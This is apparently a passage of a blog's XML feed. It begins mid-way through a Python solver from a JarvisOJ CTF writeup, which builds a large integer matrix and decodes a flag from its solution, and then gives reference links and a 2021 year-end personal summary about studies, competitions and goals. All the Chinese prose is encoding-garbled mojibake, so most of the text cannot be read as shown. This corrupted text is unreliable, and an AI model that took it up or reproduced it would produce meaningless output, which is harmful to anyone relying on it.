class="number">67</span>, <span class="number">19</span>, <span class="number">145</span>, <span class="number">12</span>, <span class="number">138</span>, <span class="number">149</span>, <span class="number">83</span>, <span class="number">178</span>, <span class="number">255</span>, <span class="number">122</span>, <span class="number">238</span>, <span class="number">187</span>, <span class="number">221</span>], [<span class="number">218</span>, <span class="number">233</span>, <span class="number">17</span>, <span class="number">56</span>, <span class="number">151</span>, <span class="number">28</span>, <span class="number">150</span>, <span class="number">196</span>, <span class="number">79</span>, <span class="number">11</span>, <span class="number">150</span>, <span class="number">128</span>, <span class="number">52</span>, <span class="number">228</span>, <span class="number">189</span>, <span class="number">107</span>, <span class="number">219</span>, <span class="number">87</span>, <span class="number">90</span>, <span class="number">221</span>, <span class="number">45</span>, <span class="number">201</span>, <span class="number">14</span>, <span class="number">106</span>, <span class="number">230</span>], [<span class="number">30</span>, <span class="number">50</span>, <span class="number">76</span>, <span class="number">94</span>, <span class="number">172</span>, <span class="number">61</span>, <span class="number">229</span>, <span class="number">109</span>, <span class="number">216</span>, <span class="number">12</span>, <span class="number">181</span>, <span class="number">231</span>, <span class="number">174</span>, <span class="number">236</span>, <span class="number">159</span>, <span class="number">128</span>, <span class="number">245</span>, <span class="number">52</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">207</span>, <span class="number">145</span>, <span class="number">241</span>, <span class="number">196</span>, <span class="number">80</span>], [<span class="number">134</span>, <span class="number">145</span>, <span class="number">36</span>, <span class="number">255</span>, <span class="number">13</span>, <span class="number">239</span>, <span class="number">212</span>, <span class="number">135</span>, <span class="number">85</span>, <span class="number">194</span>, <span class="number">200</span>, <span class="number">50</span>, <span class="number">170</span>, <span class="number">78</span>, <span class="number">51</span>, <span class="number">10</span>, <span class="number">232</span>, <span class="number">132</span>, <span class="number">60</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">74</span>, <span class="number">117</span>, <span class="number">250</span>, <span class="number">45</span>], [<span class="number">142</span>, <span class="number">221</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">56</span>, <span class="number">120</span>, <span class="number">113</span>, <span class="number">143</span>, <span class="number">77</span>, <span class="number">190</span>, <span class="number">195</span>, <span class="number">133</span>, <span class="number">236</span>, <span class="number">111</span>, <span class="number">144</span>, <span class="number">65</span>, <span class="number">172</span>, <span class="number">74</span>, <span class="number">160</span>, <span class="number">1</span>, <span class="number">143</span>, <span class="number">242</span>, <span class="number">96</span>, <span class="number">70</span>, <span class="number">107</span>], [<span class="number">229</span>, <span class="number">79</span>, <span class="number">167</span>, <span class="number">88</span>, <span class="number">165</span>, <span class="number">38</span>, <span class="number">108</span>, <span class="number">27</span>, <span class="number">75</span>, <span class="number">240</span>, <span class="number">116</span>, <span class="number">178</span>, <span class="number">165</span>, <span class="number">206</span>, <span class="number">156</span>, <span class="number">193</span>, <span class="number">86</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">187</span>, <span class="number">161</span>, <span class="number">55</span>, <span class="number">134</span>, <span class="number">24</span>, <span class="number">249</span>], [<span class="number">235</span>, <span class="number">175</span>, <span class="number">235</span>, <span class="number">169</span>, <span class="number">73</span>, <span class="number">125</span>, <span class="number">114</span>, <span class="number">6</span>, <span class="number">142</span>, <span class="number">162</span>, <span class="number">228</span>, <span class="number">157</span>, <span class="number">160</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">167</span>, <span class="number">63</span>, <span class="number">41</span>, <span class="number">182</span>, <span class="number">55</span>, <span class="number">189</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">31</span>, <span class="number">158</span>], [<span class="number">37</span>, <span class="number">190</span>, <span class="number">169</span>, <span class="number">116</span>, <span class="number">172</span>, <span class="number">66</span>, <span class="number">9</span>, <span class="number">229</span>, <span class="number">188</span>, <span class="number">63</span>, <span class="number">138</span>, <span class="number">111</span>, <span class="number">245</span>, <span class="number">133</span>, <span class="number">22</span>, <span class="number">87</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">106</span>, <span class="number">82</span>, <span class="number">211</span>, <span class="number">252</span>, <span class="number">57</span>, <span class="number">66</span>, <span class="number">98</span>], [<span class="number">199</span>, <span class="number">48</span>, <span class="number">58</span>, <span class="number">221</span>, <span class="number">162</span>, <span class="number">57</span>, <span class="number">111</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">126</span>, <span class="number">43</span>, <span class="number">143</span>, <span class="number">225</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">141</span>, <span class="number">5</span>, <span class="number">233</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">204</span>, <span class="number">155</span>, <span class="number">141</span>], [<span class="number">212</span>, <span class="number">83</span>, <span class="number">219</span>, <span class="number">55</span>, <span class="number">132</span>, <span class="number">5</span>, <span class="number">153</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">134</span>, <span class="number">201</span>, <span class="number">255</span>, <span class="number">101</span>, <span class="number">22</span>, <span class="number">98</span>, <span class="number">215</span>, <span class="number">139</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">165</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">48</span>, <span class="number">119</span>], [<span class="number">194</span>, <span class="number">156</span>, <span class="number">10</span>, <span class="number">212</span>, <span class="number">237</span>, <span class="number">112</span>, <span class="number">17</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">227</span>, <span class="number">152</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">10</span>, <span class="number">238</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">31</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">180</span>, <span class="number">45</span>, <span class="number">94</span>], [<span class="number">110</span>, <span class="number">231</span>, <span class="number">82</span>, <span class="number">180</span>, <span class="number">109</span>, <span class="number">209</span>, <span class="number">239</span>, <span class="number">163</span>, <span class="number">30</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="number">190</span>, <span class="number">97</span>, <span class="number">256</span>, <span class="number">141</span>, <span class="number">199</span>, <span class="number">3</span>, <span class="number">30</span>, <span class="number">235</span>, <span class="number">73</span>, <span class="number">225</span>, <span class="number">244</span>, <span class="number">141</span>, <span class="number">123</span>, <span class="number">208</span>], [<span class="number">220</span>, <span class="number">248</span>, <span class="number">136</span>, <span class="number">245</span>, <span class="number">123</span>, <span class="number">82</span>, <span class="number">120</span>, <span class="number">65</span>, <span class="number">68</span>, <span class="number">136</span>, <span class="number">151</span>, <span class="number">173</span>, <span class="number">104</span>, <span class="number">107</span>, <span class="number">172</span>, <span class="number">148</span>, <span class="number">54</span>, <span class="number">218</span>, <span class="number">42</span>, <span class="number">233</span>, <span class="number">57</span>, <span class="number">115</span>, <span class="number">5</span>, <span class="number">50</span>, <span class="number">196</span>], [<span class="number">190</span>, <span class="number">34</span>, <span class="number">140</span>, <span class="number">52</span>, <span class="number">160</span>, <span class="number">34</span>, <span class="number">201</span>, <span class="number">48</span>, <span class="number">214</span>, <span class="number">33</span>, <span class="number">219</span>, <span class="number">183</span>, <span class="number">224</span>, <span class="number">237</span>, <span class="number">157</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">134</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">212</span>, <span class="number">230</span>, <span class="number">243</span>, <span class="number">236</span>, <span class="number">40</span>], [<span class="number">144</span>, <span class="number">246</span>, <span class="number">73</span>, <span class="number">161</span>, <span class="number">134</span>, <span class="number">112</span>, <span class="number">146</span>, <span class="number">212</span>, <span class="number">121</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">174</span>, <span class="number">146</span>, <span class="number">78</span>, <span class="number">235</span>, <span class="number">202</span>, <span class="number">200</span>, <span class="number">90</span>, <span class="number">254</span>, <span class="number">216</span>, <span class="number">113</span>, <span class="number">25</span>, <span class="number">114</span>, <span class="number">232</span>, <span class="number">123</span>], [<span class="number">158</span>, <span class="number">85</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">145</span>, <span class="number">21</span>, <span class="number">105</span>, <span class="number">2</span>, <span class="number">256</span>, <span class="number">69</span>, <span class="number">21</span>, <span class="number">152</span>, <span class="number">155</span>, <span class="number">88</span>, <span class="number">11</span>, <span class="number">232</span>, <span class="number">146</span>, <span class="number">238</span>, <span class="number">170</span>, <span class="number">123</span>, <span class="number">135</span>, <span class="number">150</span>, <span class="number">161</span>, <span class="number">249</span>, <span class="number">236</span>], [<span class="number">251</span>, <span class="number">96</span>, <span class="number">103</span>, <span class="number">188</span>, <span class="number">188</span>, <span class="number">8</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">237</span>, <span class="number">63</span>, <span class="number">230</span>, <span class="number">128</span>, <span class="number">166</span>, <span class="number">130</span>, <span class="number">141</span>, <span class="number">112</span>, <span class="number">254</span>, <span class="number">234</span>, <span class="number">113</span>, <span class="number">250</span>, <span class="number">1</span>, <span class="number">89</span>, <span class="number">0</span>, <span class="number">135</span>, <span class="number">119</span>], [<span class="number">192</span>, <span class="number">206</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">174</span>, <span class="number">130</span>, <span class="number">164</span>, <span class="number">95</span>, <span class="number">21</span>, <span class="number">153</span>, <span class="number">82</span>, <span class="number">254</span>, <span class="number">20</span>, <span class="number">133</span>, <span class="number">56</span>, <span class="number">7</span>, <span class="number">163</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">206</span>, <span class="number">51</span>, <span class="number">204</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">196</span>], [<span class="number">106</span>, <span class="number">63</span>, <span class="number">252</span>, <span class="number">202</span>, <span class="number">153</span>, <span class="number">6</span>, <span class="number">193</span>, <span class="number">146</span>, <span class="number">88</span>, <span class="number">118</span>, <span class="number">78</span>, <span class="number">58</span>, <span class="number">214</span>, <span class="number">168</span>, <span class="number">68</span>, <span class="number">128</span>, <span class="number">68</span>, <span class="number">35</span>, <span class="number">245</span>, <span class="number">144</span>, <span class="number">102</span>, <span class="number">20</span>, <span class="number">194</span>, <span class="number">207</span>, <span class="number">66</span>], [<span class="number">154</span>, <span class="number">98</span>, <span class="number">219</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">131</span>, <span class="number">185</span>, <span class="number">27</span>, <span class="number">162</span>, <span class="number">214</span>, <span class="number">63</span>, <span class="number">238</span>, <span class="number">248</span>, <span class="number">38</span>, <span class="number">129</span>, <span class="number">170</span>, <span class="number">180</span>, <span class="number">181</span>, <span class="number">96</span>, <span class="number">165</span>, <span class="number">78</span>, <span class="number">121</span>, <span class="number">55</span>, <span class="number">214</span>], [<span class="number">193</span>, <span class="number">94</span>, <span class="number">107</span>, <span class="number">45</span>, <span class="number">83</span>, <span class="number">56</span>, <span class="number">2</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">169</span>, <span class="number">120</span>, <span class="number">58</span>, <span class="number">105</span>, <span class="number">178</span>, <span class="number">58</span>, <span class="number">217</span>, <span class="number">18</span>, <span class="number">93</span>, <span class="number">212</span>, <span class="number">74</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">219</span>, <span class="number">89</span>, <span class="number">212</span>], [<span class="number">164</span>, <span class="number">228</span>, <span class="number">5</span>, <span class="number">133</span>, <span class="number">175</span>, <span class="number">164</span>, <span class="number">37</span>, <span class="number">176</span>, <span class="number">94</span>, <span class="number">232</span>, <span class="number">82</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">212</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">153</span>, <span class="number">119</span>, <span class="number">85</span>, <span class="number">147</span>, <span class="number">256</span>, <span class="number">130</span>, <span class="number">248</span>, <span class="number">235</span>], [<span class="number">221</span>, <span class="number">178</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">215</span>, <span class="number">200</span>, <span class="number">188</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">172</span>, <span class="number">133</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">83</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">215</span>, <span class="number">204</span>, <span class="number">141</span>, <span class="number">226</span>, <span class="number">118</span>, <span class="number">233</span>, <span class="number">156</span>], [<span class="number">236</span>, <span class="number">142</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>, <span class="number">134</span>, <span class="number">54</span>, <span class="number">239</span>, <span class="number">49</span>, <span class="number">220</span>, <span class="number">233</span>, <span class="number">216</span>, <span class="number">13</span>, <span class="number">143</span>, <span class="number">145</span>, <span class="number">112</span>, <span class="number">217</span>, <span class="number">194</span>, <span class="number">114</span>, <span class="number">221</span>, <span class="number">150</span>, <span class="number">51</span>, <span class="number">136</span>, <span class="number">31</span>, <span class="number">198</span>]])</span><br><span class="line">x = <span class="title function_">solve</span>(o,r)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="title function_">len</span>(x)):</span><br><span class="line">       char = <span class="title function_">chr</span>(<span class="title function_">int</span>(<span class="title function_">round</span>((x[i]))))</span><br><span class="line">       flag += char</span><br><span class="line"><span class="title function_">print</span>(flag)</span><br></pre></td></tr></table></figure><p>å¾—åˆ° flag</p><blockquote><p>è¿™æ¬¡å›è¿‡å¤´é‡æ–°åšä¸€éï¼Œæ•´ç† wp çœŸçš„æ˜¯ä½“ä¼šåˆ°æ¸©æ•…çŸ¥æ–°çš„æ„Ÿè§‰äº†ï¼Œä¸€å¹´å‰åšå¾—æ‡µæ‡µçš„é¢˜ç›®ï¼Œç°åœ¨é‡æ–°ç†è§£èµ·æ¥ä¹Ÿä¸é‚£ä¹ˆå›°éš¾äº†</p><blockquote><p>å‚è€ƒ wp<a href="https://cloud.tencent.com/developer/article/1038017">Jarvis-OJå¹³å°å¤šé¢˜WriteUpåˆ†äº«</a></p><p><a href="https://blog.csdn.net/qq_31481187/article/details/53189113">JarvisOJ Web&amp;Reverse&amp;Pwn</a></p><p><a href="https://blog.csdn.net/qq_35078631/article/details/77284684">jarvis oj  Web   By   Assassin</a></p><p><a href="https://blog.csdn.net/weixin_30596735/article/details/95187913?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-9.baidujs&depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-9.baidujs">jarvis OJ WEBé¢˜ç›®writeup</a></p><p><a href="https://blog.csdn.net/xiaorouji/article/details/81675992?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-10.baidujs&depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-10.baidujs">jarvis ojï¼ˆweb wpï¼‰</a></p><p><a href="https://skysec.top/2017/08/16/jarvisoj-web/#61dctf-babyphp">jarvisoj-web</a></p></blockquote></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JarvisOJ&amp;Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸ºä»€ä¹ˆä¸€ä¸ªæŠ€æœ¯ä»”å†³å®šèµ°ä¸Šè€ƒç ”è·¯</title>
      <link href="/posts/25575/"/>
      <url>/posts/25575/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2021å¹´ç»ˆæ€»ç»“</title>
      <link href="/posts/8569/"/>
      <url>/posts/8569/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p> 2021 ä¸€å¹´èµ°ä¸‹æ¥ï¼Œæ„Ÿè§‰å°±å¥½åƒèµ°åˆ°äº†äººç”Ÿçš„åˆä¸€ä¸ªæ‹ç‚¹ï¼Œè·Ÿé«˜ä¸‰é‚£å¹´ä¸€æ ·ã€‚</p></blockquote><blockquote><p><del>2021.12.28 æ›´æ–°</del>äº†ä¸ªå¯‚å¯</p><p>2021.12.31 å‡Œæ™¨æ›´æ–°</p><p>è€ƒè¯•èƒŒä¸å®Œäº†ï¼Œäº‹æƒ…å¿™ä¸å®Œäº†ï¼Œ<del>å¤ªæƒ³æ‘†çƒ‚äº†</del>ï¼Œç­‰ 1.6 å»æ¾å±±æ¹–æ‰¾é¹ç¥ç©å›æ¥ä»¥åå†æ›´æ–°å®Œæ•´ç‰ˆ</p><p>2022.1.12 æ­£å¼å¼€å†™</p></blockquote><h1 id="rm-flag-touch-flag"><a href="#rm-flag-touch-flag" class="headerlink" title="rm flag ; touch flag"></a>rm flag ; touch flag</h1><p>æƒ¯ä¾‹è¿™é‡Œæ”¾ç€è‡ªå·±åœ¨æ–°çš„ä¸€å¹´é‡Œçš„ç›®æ ‡ä¸æœŸæœ›ï¼ŒåŒæ—¶ä¹Ÿå¯¹ä¸Šä¸€å¹´çš„ flag è¿›è¡Œæ€»ç»“</p><h2 id="2021-å¹´éƒ½è¯´è¿‡ä»€ä¹ˆè ¢è¯å‘¢ï¼Ÿ"><a href="#2021-å¹´éƒ½è¯´è¿‡ä»€ä¹ˆè ¢è¯å‘¢ï¼Ÿ" class="headerlink" title="2021 å¹´éƒ½è¯´è¿‡ä»€ä¹ˆè ¢è¯å‘¢ï¼Ÿ"></a>2021 å¹´éƒ½è¯´è¿‡ä»€ä¹ˆè ¢è¯å‘¢ï¼Ÿ</h2><ul><li><p><input checked="" disabled="" type="checkbox"> <strong>å¥½å¥½åƒé¥­ï¼Œå¥½å¥½ä¸Šè¯¾ï¼Œå¥½å¥½ç¡è§‰ï¼ŒåŠ¡å¿…åšåˆ°</strong></p></li><li><p><input checked="" disabled="" type="checkbox"> <strong>è½¬å‹äºŒè¿›åˆ¶é€‰æ‰‹ï¼Œ<del>webä¹Ÿä¸èƒ½è½ä¸‹</del></strong></p></li><li><p><input checked="" disabled="" type="checkbox"> <strong>å­¦ä¼šåšå¼€å‘ï¼å­¦ä¼šåšå¼€å‘ï¼å­¦ä¼šåšå¼€å‘ï¼ï¼ï¼</strong></p></li><li><p><input checked="" disabled="" type="checkbox"> <strong>æé«˜å­¦ä¹ æ•ˆç‡ï¼Œå°½é‡å°‘ç†¬å¤œï¼Œä¸è¦å†å›°å€’åœ¨å•æ‰€é—¨å£çš„åƒåœ¾æ¡¶æ—è¾¹äº†</strong></p></li><li><p><input checked="" disabled="" type="checkbox"> <strong>å¤šè¯»ä¹¦ï¼ŒåŒæ—¶ä¹Ÿè¦åšè¯»ä¹¦ç¬”è®°ï¼Œä¸ç„¶çœ‹äº†å°±å¿˜ï¼Œæ²¡ç”¨</strong></p></li><li><p><input disabled="" type="checkbox"> <strong>äº‰å–å¤§äºŒæš‘å‡ç»“æŸå»æ‰¾ä¸ªå®ä¹ </strong></p></li><li><p><input checked="" disabled="" type="checkbox"> <strong>å¤šæ‰“æ¯”èµ›ï¼Œäº‰å–å¤šæ‹¿å‡ ä¸ªå¥–ï¼Œäº‰å–è¿›ä¸€æ¬¡å¤§æ¯”èµ›çš„çº¿ä¸‹èµ›ï¼Œä¸¤æ¬¡ä¸‰æ¬¡æ›´å¥½ï¼</strong></p></li><li><p><input disabled="" type="checkbox"> <strong>æŠ½ç‚¹æ—¶é—´å‡ºæ¥æ‰“æ¸¸æˆé™ªé™ªè‡ªå·±ï¼Œä¸è¦åªä¹°æ¸¸æˆä¸ç©æ¸¸æˆ</strong></p></li><li><p><input disabled="" type="checkbox"> <strong>é”»ç‚¼èº«ä½“</strong></p></li></ul><blockquote><p>æœ¬ä»¥ä¸ºä¼šæœ‰å¤§éƒ¨åˆ†å®Œä¸æˆï¼Œä½†æ˜¯å›é¡¾ä¸‹æ¥å±…ç„¶ä¹Ÿå®Œæˆäº†å¾ˆå¤š</p><p>åœ¨ç”Ÿæ´»ä¸Šï¼Œå»å¹´å¤§éƒ¨åˆ†æ—¶é—´è¿˜æ˜¯æœ‰å¥½å¥½ç¡è§‰ï¼Œå°‘éƒ¨åˆ†æ—¶é—´ä½œæ¯å¤±è°ƒï¼Œè€ƒè¯•å‰å‡ å¤©è¿˜æ˜¯å› ä¸ºæ‹–å»¶ç—‡è¦åŠé€šå®µæ¥èµ¶ï¼Œä½†æ˜¯è‡ªæˆ‘æ„Ÿè§‰å­¦ä¹ æ•ˆç‡å’Œæ–¹æ³•æœ‰è¿›æ­¥ã€‚è™½ç„¶æœ€åè¿˜æ˜¯å› ä¸ºå„ç§åŸå› æ²¡æœ‰æ—¶é—´å’Œç²¾åŠ›ç©æ¸¸æˆï¼Œä½†æ˜¯ä¹Ÿé™ªå­¦é•¿å®Œæ•´é€šå…³äº†ä¸€å‘¨ç›®çš„ã€ŠåŒäººæˆè¡Œã€‹ã€‚æ¯”è¾ƒé—æ†¾çš„å°±æ˜¯æ²¡æœ‰å¥½å¥½é”»ç‚¼èº«ä½“ï¼Œæš‘å‡ç•™æ ¡åšæŒè·‘äº†åŠä¸ªæœˆæ­¥åˆå› ä¸ºæ‹–å»¶ç—‡æ–­æ‰: (</p><p>åœ¨æŠ€æœ¯ä¸Šï¼Œç¡®å®è½¬å‹æˆäº†ä¸€ååŠåŠå­äºŒè¿›åˆ¶é€‰æ‰‹ï¼Œä¹Ÿè·Ÿå¸ˆå‚…åšäº†ä¸ª fuzz çš„å°é¡¹ç›®ï¼Œæœ‰äº†è‡ªå·±çš„ä¸€ç‚¹å°ç†è§£å’Œä¹‹åæƒ³è¦ç ”ç©¶çš„æ–¹å‘ï¼ˆğŸï¼‰ï¼Œä½†æ˜¯è¿˜æ˜¯æ¯”è¾ƒèœã€‚åœ¨ä¸€å †å¤§ä½œä¸šå’Œè¯¾è®¾é‡Œï¼Œä¹Ÿå­¦ä¼šäº†ä¸€ç‚¹å¼€å‘ï¼Œä¸è‡³äºè¦åˆ«äººå¸¦ï¼Œè‡ªå·±ä¹Ÿèƒ½å¤Ÿ Cã€‚åŒæ ·æ¯”è¾ƒé—æ†¾çš„æ˜¯éš¾å¾—è¿›çš„ä¸¤æ¬¡çº¿ä¸‹èµ›ï¼Œä¸€ä¸ªè“å¸½ä¸€ä¸ªå›½èµ›ï¼Œéƒ½åœ¨å¹¿å·ï¼Œç„¶åå¹¿å·å°±ç–«æƒ…ï¼Œçº¿ä¸‹æ”¹çº¿ä¸Šï¼Œä¸¤è·¯æ‘„åƒå¤´æ˜¯çœŸçš„è ¢ï¼Œå¯èƒ½æ˜¯æˆ‘å¤ªéœ‰äº† : (  ã€‚è‡³äºä¸ºä»€ä¹ˆæ²¡æ‰¾å®ä¹ ï¼Œå› ä¸ºé‚£æ—¶å€™æ‰“ç®—è·Ÿæ‰«åœ°åƒ§å­¦é•¿ä¸€èµ·å»ä¸€ä¸ªæ¯•ä¸šå­¦é•¿çš„å…¬å¸ï¼Œæœ€åæ‰«åœ°åƒ§å’•äº†ï¼Œæˆ‘ä¹Ÿæ‘†äº†</p></blockquote><h2 id="æ–°å¹´æ•´æ–°æ´»"><a href="#æ–°å¹´æ•´æ–°æ´»" class="headerlink" title="æ–°å¹´æ•´æ–°æ´»"></a>æ–°å¹´æ•´æ–°æ´»</h2><ul><li><input disabled="" type="checkbox"> <strong>å¥½å¥½åƒé¥­ï¼Œå¥½å¥½ä¸Šè¯¾ï¼Œå¥½å¥½ç¡è§‰</strong></li><li><input disabled="" type="checkbox"> <strong>å…‹æœæ‹–å»¶ç—‡</strong></li><li><input disabled="" type="checkbox"> <strong>æ‹¿ä¸‹ä¸€å° macOS</strong></li><li><input disabled="" type="checkbox"> <strong>ç©ºé—²æ—¶é—´ç»§ç»­å­¦äºŒè¿›åˆ¶ï¼Œå°è¯•å¤ç°ä¸€äº›ğŸçš„æ¼æ´</strong></li><li><input disabled="" type="checkbox"> <strong>è¿‡å¤§å››ä½“æµ‹</strong></li><li><input disabled="" type="checkbox"> <strong>è£…ä¿®å¥½è‡ªå·±çš„æˆ¿é—´</strong></li><li><input disabled="" type="checkbox"> <strong>å…»æˆä¸€äº›è‰¯å¥½çš„ä¹ æƒ¯ï¼Œæ¯”å¦‚æ—©ç¡æ—©èµ·ã€è·‘æ­¥&#x2F;æ•£æ­¥&#x2F;å¿«èµ°</strong></li><li><input disabled="" type="checkbox"> <strong>èº«ä½“æ¢å¤æ­£å¸¸</strong></li></ul><blockquote><p>2022.1.17 æ›´æ–°</p><p>å¤šçš„ä¸è¯´ï¼Œæ–°çš„ä¸€å¹´ç»§ç»­åŠªåŠ›ï¼</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E8%8D%89%E8%8E%93%E7%86%8A.gif"></p><h1 id="ä¸ŠåŠå¹´"><a href="#ä¸ŠåŠå¹´" class="headerlink" title="ä¸ŠåŠå¹´"></a>ä¸ŠåŠå¹´</h1><p>ä¸ŠåŠå¹´ç›¸å¯¹ä¸‹åŠå¹´æ¥è¯´å¿™ä¸€äº›ï¼Œå› ä¸ºè¯¾æ˜¯çœŸçš„å¤šï¼Œè¿˜æœ‰ä¸€äº›é¡¹ç›®å’Œæ¯”èµ›ã€‚ä¹Ÿæ­£æ˜¯åœ¨ä¸ŠåŠå¹´ï¼Œçªç„¶å†’å‡ºçš„è€ƒç ”è‹—å¤´è®©æˆ‘ä¸€ç›´åœ¨çº ç»“ï¼Œä¹Ÿç»å†äº†ä¸€æ®µéå¸¸éå¸¸è¿·èŒ«çš„æ—¶æœŸï¼Œç”šè‡³æ€€ç–‘è¿‡è‡ªå·±æ˜¯å¦é€‚åˆç»§ç»­ææŠ€æœ¯ã€‚ä¸ºäº†ä¸è®©è‡ªå·±èƒ¡æ€ä¹±æƒ³ï¼Œåªèƒ½æ˜¯æƒ³åŠæ³•è®©è‡ªå·±å¿™èµ·æ¥ï¼Œå…ˆåšå¥½æ‰‹å¤´çš„äº‹ï¼Œæ‰€ä»¥ä¸ŠåŠå¹´çš„æˆç»©è¿˜å¯ä»¥ï¼Œæ²¡æ€ä¹ˆé€ƒè¯¾å’Œæ‘†çƒ‚ï¼Œè¿˜æ°´äº†ç‚¹æ¯”èµ›å’Œé¡¹ç›®ã€‚</p><blockquote><p>2022.1.18 æ›´æ–°</p><p>å…³äºæˆ‘ä¸ºä»€ä¹ˆè€ƒç ”ï¼Œæ°´äº†ä¸€ç¯‡ã€Šä¸ºä»€ä¹ˆä¸€ä¸ªæŠ€æœ¯ä»”å†³å®šèµ°ä¸Šè€ƒç ”è·¯ã€‹ï¼Œå…¶å®ä¹Ÿæ˜¯ä»å¼€å§‹åˆ°å†³å®šçš„å¿ƒè·¯å†ç¨‹å’Œæ€æƒ³æ–—äº‰</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/A60403BIEB8QRHXP%60NLRHQX.png"></p></blockquote><h2 id="æ–¹ç­å¹¿äº¤ä¼šä¼—æµ‹"><a href="#æ–¹ç­å¹¿äº¤ä¼šä¼—æµ‹" class="headerlink" title="æ–¹ç­å¹¿äº¤ä¼šä¼—æµ‹"></a>æ–¹ç­å¹¿äº¤ä¼šä¼—æµ‹</h2><p>ç¬¬ä¸€æ¬¡æ‰“ï¼Œæ„Ÿè§‰å°±æ˜¯æŒºæ°´çš„ï¼Œä¼°è®¡ä¹Ÿæ˜¯æ‰“çš„äººå°‘ï¼ˆè¿æˆ‘æ‰«åœ°åƒ§å¸ˆå‚…éƒ½æ²¡å‚åŠ ï¼‰åŠ ä¸Šå®¡æ´çš„äººæœ‰ç‚¹æ‘†ï¼Œæ€»ç»“å°±æ˜¯é€»è¾‘æ¼æ´æ¯”è¾ƒå¤šï¼Œæœ€åäº¤ä¸Šå»ä¸‰ä¸ªé€»è¾‘ä¸¤ä¸ªæ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œè¿˜æ··äº†ä¸ªå…¨å›½ç¬¬ä¸‰åå’Œä¸€å¼ è¯ä¹¦ï¼Œä¹Ÿæ‹¿åˆ°äº†èŒä¸šç”Ÿæ¶¯å†…æœ€å¤šçš„ä¸€ç¬”å¥–é‡‘ï¼Œæœ‰å°†è¿‘ 1800ï¼Œè¿™ç¬”é’±æœ€åæˆäº† iPad pro çš„ä¸€éƒ¨åˆ†ã€‚ä¸‹åŠå¹´çš„æ²¡æœ‰æ‰“ï¼Œå› ä¸ºé‚£å¤©å¿™å°ç­çš„äº‹æƒ…å¿™äº†ä¸€å¤©ï¼Œä¸è¿‡ä¸‹åŠå¹´è§„å®šåŒä¸€å­¦æ ¡ä¸åŒçš„äººä¸èƒ½äº¤åŒä¸€ä¸ªæ´ï¼Œå¤§å®¶å·æ¥å·å»å°±æ˜¯çœ‹è°æå‰è¸©ç‚¹å’Œæ‹¼æ‰‹é€Ÿäº†ã€‚</p><p>æœ€åå­¦é™¢è¿˜ä¸“é—¨æä¸ªæµ·æŠ¥æ‘†å‡ºæ¥ï¼Œè¯´å®è¯çœŸçš„æœ‰ç‚¹å¤¸å¼ äº†ï¼Œå®åœ¨æ˜¯åä¸å‰¯å®ï¼Œå½“æ—¶æˆ‘çš„ web æ°´å¹³å·²ç»åœä½å¥½ä¹…äº†ï¼Œé€»è¾‘æ¼æ´éƒ½æ˜¯ç°å­¦ç°æŒ–çš„ï¼Œæå¾—æˆ‘éƒ½ä¸å¥½æ„æ€åœ¨äº”æ•™ä¸€æ¥¼é‚£è¾¹èµ°ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118010821.png" alt="å®³ç¾ç¾"></p><h2 id="æŸå…¬å¸-fuzz-é¡¹ç›®"><a href="#æŸå…¬å¸-fuzz-é¡¹ç›®" class="headerlink" title="æŸå…¬å¸ fuzz é¡¹ç›®"></a>æŸå…¬å¸ fuzz 